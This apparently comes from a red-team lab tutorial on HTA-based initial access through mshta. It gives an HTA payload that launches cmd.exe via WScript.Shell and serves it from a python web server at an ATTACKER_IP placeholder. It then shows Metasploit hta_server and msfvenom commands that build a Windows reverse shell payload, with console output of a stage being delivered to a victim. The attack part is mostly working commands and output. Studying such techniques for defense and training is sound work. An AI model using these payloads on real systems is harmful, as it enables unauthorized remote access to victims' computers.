title: HTA
description:  An HTML Application (HTA) is a Microsoft Windows program that combines HTML, Dynamic HTML, and scripting languages supported by Internet Explorer, such as VBScript or JScript, to create a desktop application-like interface

## HTML Application

The LOLBINS tool `mshta` is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 


In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. 

Consider the following HTML code.

```html
<html>
<body>
	<script>
		let c ='cmd.exe';
		new ActiveXObject('WScript.Shell').Run(c);
	</script>
</body>
</html>
```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,
```bash
user@machine$ python3 -m http.server 8090 
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```
On the victim machine, visit the malicious link  http://ATTACKER_IP.37:8090/payload.hta

## Malicious HTA

Another way to generate and serve malicious HTA files using the Metasploit framework.

```bash
msf6 > use exploit/windows/misc/hta_server 
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37 
LHOST => 10.8.232.37 
msf6 exploit(windows/misc/hta_server) > set LPORT 443 
LPORT => 443 
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37 
SRVHOST => 10.8.232.37 
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp 
msf6 exploit(windows/misc/hta_server) > exploit 
[*] Exploit running as background job 0. 
[*] Exploit completed, but no session was created. msf6 exploit(windows/misc/hta_server) > 
[*] Started reverse TCP handler on 10.8.232.37:443 
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta 
[*] Server started.

```
We can create a reverse shell payload as follows,
```bash
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443-f hta-psh -o malicious.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: malicious.hta
```

On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
```bash
user@machine$[*]10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
